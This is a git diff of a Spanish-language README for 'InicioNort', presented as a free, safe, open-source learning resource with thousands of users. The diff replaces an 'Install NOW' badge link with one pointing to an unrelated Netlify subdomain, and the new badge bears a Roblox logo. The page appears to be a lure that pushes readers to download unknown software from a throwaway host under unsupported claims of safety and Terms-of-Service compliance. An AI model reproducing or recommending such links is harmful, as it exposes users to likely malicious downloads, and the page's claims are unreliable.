@@ -5,7 +5,7 @@
 **Descripción**  
 **InicioNort** es un recurso gratuito de 2025 para principiantes que desean aprender nuevas habilidades. Seguro, de código abierto y conforme con los Términos de Servicio de GitHub. ¡Únete a 9K+ usuarios para iniciar tu aprendizaje!  
 
-- [![InstallUpdatingSetup](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 ![Vista Previa](https://sdmntprwestus2.oaiusercontent.com/files/00000000-27d4-61f8-b4ad-64ecef48b011/raw?se=2025-09-05T04%3A40%3A58Z&sp=r&sv=2024-08-04&sr=b&scid=34f12c27-0cc1-5671-b49d-46233feb4545&skoid=b928fb90-500a-412f-a661-1ece57a7c318&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-09-04T18%3A45%3A01Z&ske=2025-09-05T18%3A45%3A01Z&sks=b&skv=2024-08-04&sig=A2k%2BZuBP%2BR%2BRK86cFa9R0cQjVZeJ/9w5F5jKviotAhk%3D)  
 
 **¿Por Qué InicioNort?**  
